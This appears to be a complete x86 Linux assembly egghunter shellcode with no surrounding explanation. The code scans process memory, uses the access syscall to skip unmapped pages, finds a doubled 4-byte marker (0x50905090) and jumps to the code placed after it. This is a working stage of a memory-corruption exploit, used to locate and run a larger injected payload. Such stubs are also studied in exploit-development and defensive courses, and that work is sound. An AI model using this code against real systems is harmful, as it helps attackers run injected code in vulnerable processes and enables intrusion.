global _start
section .text
_start:

xor edx,edx
next_page:
or dx,0xfff
next_adress:
inc edx
lea ebx,[edx+0x4]
push byte +0x21
pop eax
int 0x80
cmp al,0xf2
jz next_page 
mov eax,0x50905090
mov edi,edx
scasd
jnz next_adress 
scasd
jnz next_adress 
jmp edi
